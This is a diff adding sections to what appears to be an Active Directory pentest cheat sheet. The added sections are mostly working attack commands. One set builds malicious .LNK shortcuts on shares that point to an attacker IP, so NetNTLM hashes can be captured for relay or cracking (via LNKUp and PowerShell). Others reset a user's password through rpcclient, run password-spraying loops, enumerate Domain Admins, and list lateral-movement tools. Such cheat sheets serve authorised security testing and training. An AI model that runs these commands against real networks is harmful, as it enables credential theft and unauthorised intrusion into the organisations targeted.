@@ -43,6 +43,11 @@ hashcat -m 18200 'asrep-roast.hashes' -a 0 ./wordlists/rockyou.txt
 
 # Authenticated enumeration
 
+### MISC Enumeration commands
+Recursive search for *Domain Admins* members
+```
+dsquery group -name "Domain Admins" | dsget group -expand -members
+```
 
 ### Active Directory user and computer account description
 Using crackmapexec to get active directory user description
@@ -161,7 +166,54 @@ spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 cema.canadaegg.ca NOUSERUS
 
 - https://github.com/ShutdownRepo/smartbrute
 
+### LNK Files
+If you get access to a share we can create a malicious .LNK file. This .LNK file will includes a refernece to the attacker computers.
+You can after choose to Relay the *NetNTLM* hash or crack it.
+
+- https://github.com/Plazmaz/LNKUp
+Use --execute to specify a command to run when the shortcut is double clicked 
+```
+ lnkup.py --host attackerIP --type ntlm --output out.lnk --execute "shutdown /s"
+```
+
+Using PowerShell
+```
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Malicious.lnk")
+$lnk.TargetPath = "\\<attackerIP>\@file.txt"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "LNK file"
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
+
+### RPC Misc
+##### AD user password modification using rpcclient  
+
+```
+user@host # rpcclient -U supportAccount //192.168.0.100
+[...] authenticate using the supportAccount password which needs to be modified
+rpcclient $> setuserinfo2 supportAccount 23 SuperNewPassword22
+```
+
+--> Note : If package passing-the-hash is installed on attacker machine, you can even do this with just a NTLM hash. (Flag : --pw-nt-hash)
+
+##### RPC password spraying
+
+```
+while read x; do echo $x; rpcclient -U “DOMAIN/$x%PasswOrd123” -c “getusername;quit” 192.168.0.110; done < ./userlist.txt
+
+Using bash script:
+#/bin/bash
+for u in 'cat dom_users.txt'
+do echo -n "[*] user: $u" && rpcclient -U "$u%password" -c "getusername;quit" 10.10.10.192
+done
+```
+
 ### Kerberoasting
+Service Principal Names (SPN's) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).  
+
 The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts.
 
 ```
@@ -618,7 +670,7 @@ https://github.com/ly4k/Certipy
 - Permissive Active Directory Domain Services https://blog.netspi.com/exploiting-adidns/
 - DHCP spoofing
 - ARP spoofing
-- lateral movement (wmiexec, smbexec, psexec) and what do they do on te targeted system side
+- lateral movement (wmiexec, smbexec, psexec, atexec, comexec) and what do they do on te targeted system side
 - smb enumeration (smbmap, smbclient)
 - MITM6
 - Pypykatz
